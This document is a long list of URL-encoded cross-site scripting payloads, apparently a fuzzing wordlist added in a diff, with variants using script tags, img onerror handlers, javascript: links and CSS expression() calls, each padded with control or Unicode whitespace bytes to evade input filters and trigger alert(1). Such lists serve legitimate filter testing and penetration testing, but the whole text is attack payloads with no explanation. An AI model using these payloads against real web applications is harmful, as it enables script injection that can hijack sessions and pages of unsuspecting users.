+%3Cscript%3Eif(%22x//xE0/xB9/x92%22.length==2)%20%7B%20javascript:alert(1);%7D%3C/script%3E  
+%22%3E%3Cscript%3Eif(%22x//xE0/xB9/x92%22.length==2)%20%7B%20javascript:alert(1);%7D%3C/script%3E  
+'%3E%3Cscript%3Eif(%22x//xE0/xB9/x92%22.length==2)%20%7B%20javascript:alert(1);%7D%3C/script%3E  
+%3Cscript%3Eif(%22x//xEE/xA9/x93%22.length==2)%20%7B%20javascript:alert(1);%7D%3C/script%3E  
+%22%3E%3Cscript%3Eif(%22x//xEE/xA9/x93%22.length==2)%20%7B%20javascript:alert(1);%7D%3C/script%3E  
+'%3E%3Cscript%3Eif(%22x//xEE/xA9/x93%22.length==2)%20%7B%20javascript:alert(1);%7D%3C/script%3E  
+'%60%22%3E%3C/x3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+%22'%60%3E%3C/x3Cimg%20src=xxx:x%20onerror=javascript:alert(1)%3E  
+%22'%60%3E%3C/x00img%20src=xxx:x%20onerror=javascript:alert(1)%3E  
+%3Cscript%20src=%22data:text/plain/x2Cjavascript:alert(1)%22%3E%3C/script%3E  
+%22%3E%3Cscript%20src=%22data:text/plain/x2Cjavascript:alert(1)%22%3E%3C/script%3E  
+'%3E%3Cscript%20src=%22data:text/plain/x2Cjavascript:alert(1)%22%3E%3C/script%3E  
+%3Cscript%20src=%22data:/xD4/x8F,javascript:alert(1)%22%3E%3C/script%3E  
+%22%3E%3Cscript%20src=%22data:/xD4/x8F,javascript:alert(1)%22%3E%3C/script%3E  
+'%3E%3Cscript%20src=%22data:/xD4/x8F,javascript:alert(1)%22%3E%3C/script%3E  
+%3Cscript%20src=%22data:/xE0/xA4/x98,javascript:alert(1)%22%3E%3C/script%3E  
+%22%3E%3Cscript%20src=%22data:/xE0/xA4/x98,javascript:alert(1)%22%3E%3C/script%3E  
+'%3E%3Cscript%20src=%22data:/xE0/xA4/x98,javascript:alert(1)%22%3E%3C/script%3E  
+%3Cscript%20src=%22data:/xCB/x8F,javascript:alert(1)%22%3E%3C/script%3E  
+%22%3E%3Cscript%20src=%22data:/xCB/x8F,javascript:alert(1)%22%3E%3C/script%3E  
+'%3E%3Cscript%20src=%22data:/xCB/x8F,javascript:alert(1)%22%3E%3C/script%3E  
+ABC%3Cdiv%20style=%22x/x3Aexpression(javascript:alert(1)%22%3EDEF  
+ABC%3Cdiv%20style=%22x:expression/x5C(javascript:alert(1)%22%3EDEF  
+ABC%3Cdiv%20style=%22x:expression/x00(javascript:alert(1)%22%3EDEF  
+ABC%3Cdiv%20style=%22x:exp/x00ression(javascript:alert(1)%22%3EDEF  
+ABC%3Cdiv%20style=%22x:exp/x5Cression(javascript:alert(1)%22%3EDEF  
+ABC%3Cdiv%20style=%22x:/x0Aexpression(javascript:alert(1)%22%3EDEF  
+ABC%3Cdiv%20style=%22x:/x09expression(javascript:alert(1)%22%3EDEF  
+ABC%3Cdiv%20style=%22x:/xE3/x80/x80expression(javascript:alert(1)%22%3EDEF  
+ABC%3Cdiv%20style=%22x:/xE2/x80/x84expression(javascript:alert(1)%22%3EDEF  
+ABC%3Cdiv%20style=%22x:/xC2/xA0expression(javascript:alert(1)%22%3EDEF  
+ABC%3Cdiv%20style=%22x:/xE2/x80/x80expression(javascript:alert(1)%22%3EDEF  
+ABC%3Cdiv%20style=%22x:/xE2/x80/x8Aexpression(javascript:alert(1)%22%3EDEF  
+ABC%3Cdiv%20style=%22x:/x0Dexpression(javascript:alert(1)%22%3EDEF  
+ABC%3Cdiv%20style=%22x:/x0Cexpression(javascript:alert(1)%22%3EDEF  
+ABC%3Cdiv%20style=%22x:/xE2/x80/x87expression(javascript:alert(1)%22%3EDEF  
+ABC%3Cdiv%20style=%22x:/xEF/xBB/xBFexpression(javascript:alert(1)%22%3EDEF  
+ABC%3Cdiv%20style=%22x:/x20expression(javascript:alert(1)%22%3EDEF  
+ABC%3Cdiv%20style=%22x:/xE2/x80/x88expression(javascript:alert(1)%22%3EDEF  
+ABC%3Cdiv%20style=%22x:/x00expression(javascript:alert(1)%22%3EDEF  
+ABC%3Cdiv%20style=%22x:/xE2/x80/x8Bexpression(javascript:alert(1)%22%3EDEF  
+ABC%3Cdiv%20style=%22x:/xE2/x80/x86expression(javascript:alert(1)%22%3EDEF  
+ABC%3Cdiv%20style=%22x:/xE2/x80/x85expression(javascript:alert(1)%22%3EDEF  
+ABC%3Cdiv%20style=%22x:/xE2/x80/x82expression(javascript:alert(1)%22%3EDEF  
+ABC%3Cdiv%20style=%22x:/x0Bexpression(javascript:alert(1)%22%3EDEF  
+ABC%3Cdiv%20style=%22x:/xE2/x80/x81expression(javascript:alert(1)%22%3EDEF  
+ABC%3Cdiv%20style=%22x:/xE2/x80/x83expression(javascript:alert(1)%22%3EDEF  
+ABC%3Cdiv%20style=%22x:/xE2/x80/x89expression(javascript:alert(1)%22%3EDEF  
+%3Ca%20href=%22/x0Bjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x0Bjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x0Bjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x0Fjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x0Fjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x0Fjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/xC2/xA0javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/xC2/xA0javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/xC2/xA0javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x05javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x05javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x05javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/xE1/xA0/x8Ejavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/xE1/xA0/x8Ejavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/xE1/xA0/x8Ejavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x18javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x18javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x18javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x11javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x11javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x11javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/xE2/x80/x88javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/xE2/x80/x88javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/xE2/x80/x88javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/xE2/x80/x89javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/xE2/x80/x89javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/xE2/x80/x89javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/xE2/x80/x80javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/xE2/x80/x80javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/xE2/x80/x80javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x17javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x17javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x17javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x03javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x03javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x03javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x0Ejavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x0Ejavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x0Ejavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x1Ajavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x1Ajavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x1Ajavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x00javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x00javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x00javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x10javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x10javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x10javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/xE2/x80/x82javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/xE2/x80/x82javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/xE2/x80/x82javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x20javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x20javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x20javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x13javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x13javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x13javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x09javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x09javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x09javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/xE2/x80/x8Ajavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/xE2/x80/x8Ajavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/xE2/x80/x8Ajavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x14javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x14javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x14javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x19javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x19javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x19javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/xE2/x80/xAFjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/xE2/x80/xAFjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/xE2/x80/xAFjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x1Fjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x1Fjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x1Fjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/xE2/x80/x81javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/xE2/x80/x81javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/xE2/x80/x81javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x1Djavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x1Djavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x1Djavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/xE2/x80/x87javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/xE2/x80/x87javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/xE2/x80/x87javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x07javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x07javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x07javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/xE1/x9A/x80javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/xE1/x9A/x80javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/xE1/x9A/x80javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/xE2/x80/x83javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/xE2/x80/x83javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/xE2/x80/x83javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x04javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x04javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x04javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x01javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x01javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x01javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x08javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x08javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x08javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/xE2/x80/x84javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/xE2/x80/x84javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/xE2/x80/x84javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/xE2/x80/x86javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/xE2/x80/x86javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/xE2/x80/x86javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/xE3/x80/x80javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/xE3/x80/x80javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/xE3/x80/x80javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x12javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x12javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x12javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x0Djavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x0Djavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x0Djavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x0Ajavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x0Ajavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x0Ajavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x0Cjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x0Cjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x0Cjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x15javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x15javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x15javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/xE2/x80/xA8javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/xE2/x80/xA8javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/xE2/x80/xA8javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x16javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x16javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x16javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x02javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x02javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x02javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x1Bjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x1Bjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x1Bjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x06javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x06javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x06javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/xE2/x80/xA9javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/xE2/x80/xA9javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/xE2/x80/xA9javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/xE2/x80/x85javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/xE2/x80/x85javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/xE2/x80/x85javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x1Ejavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x1Ejavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x1Ejavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/xE2/x81/x9Fjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/xE2/x81/x9Fjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/xE2/x81/x9Fjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22/x1Cjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22/x1Cjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22/x1Cjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22javascript/x00:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22javascript/x00:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22javascript/x00:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22javascript/x3A:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22javascript/x3A:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22javascript/x3A:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22javascript/x09:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22javascript/x09:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22javascript/x09:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22javascript/x0D:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22javascript/x0D:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22javascript/x0D:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22javascript/x0A:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22javascript/x0A:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22javascript/x0A:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%60%22'%3E%3Cimg%20src=xxx:x%20/x0Aonerror=javascript:alert(1)%3E  
+%60%22'%3E%3Cimg%20src=xxx:x%20/x22onerror=javascript:alert(1)%3E  
+%60%22'%3E%3Cimg%20src=xxx:x%20/x0Bonerror=javascript:alert(1)%3E  
+%60%22'%3E%3Cimg%20src=xxx:x%20/x0Donerror=javascript:alert(1)%3E  
+%60%22'%3E%3Cimg%20src=xxx:x%20/x2Fonerror=javascript:alert(1)%3E  
+%60%22'%3E%3Cimg%20src=xxx:x%20/x09onerror=javascript:alert(1)%3E  
+%60%22'%3E%3Cimg%20src=xxx:x%20/x0Conerror=javascript:alert(1)%3E  
+%60%22'%3E%3Cimg%20src=xxx:x%20/x00onerror=javascript:alert(1)%3E  
+%60%22'%3E%3Cimg%20src=xxx:x%20/x27onerror=javascript:alert(1)%3E  
+%60%22'%3E%3Cimg%20src=xxx:x%20/x20onerror=javascript:alert(1)%3E  
+%60%22'%3E%3Cimg%20src=x%20onerror=javascript:alert(&  
+%22%3E%3Cimg%20src=x%20onerror=javascript:alert(&  
+'%3E%3Cimg%20src=x%20onerror=javascript:alert(&  
+%3Cimg%20src=x%20onerror=javascript:alert(&  
+%22%3E%3Cimg%20src=x%20onerror=javascript:alert(&  
+'%3E%3Cimg%20src=x%20onerror=javascript:alert(&  
+%22%60'%3E%3Cscript%3E/x3Bjavascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/x0Djavascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/xEF/xBB/xBFjavascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/xE2/x80/x81javascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/xE2/x80/x84javascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/xE3/x80/x80javascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/x09javascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/xE2/x80/x89javascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/xE2/x80/x85javascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/xE2/x80/x88javascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/x00javascript:alert(1)%3C/script%3E  
